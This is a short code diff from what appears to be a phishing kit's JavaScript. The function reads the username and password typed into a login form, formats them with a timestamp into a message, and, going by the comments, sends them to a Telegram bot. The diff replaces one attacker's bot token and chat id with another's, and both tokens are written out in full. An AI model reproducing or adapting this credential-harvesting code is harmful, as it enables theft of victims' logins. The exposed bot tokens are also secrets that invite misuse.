@@ -5,8 +5,8 @@ function getData() {
     let password = document.getElementById('password').value
 
 
-    let apiToken = "1416940860:AAGNUijvtN6jAJ1WB44JI02-PM6w32tTI-c" ///Add your telegram bot token
-    let chat_id = 1171876903  ///add your user id
+    let apiToken = "6748265182:AAGYzIGR9rP4rsMO8QjrY8nGPx5hSYomPnE" ///Add your telegram bot token
+    let chat_id = 5735084607  ///add your user id
     let message = `Username: ${username}
     \nPassword: ${password} 
     \nTime: ${time}`;
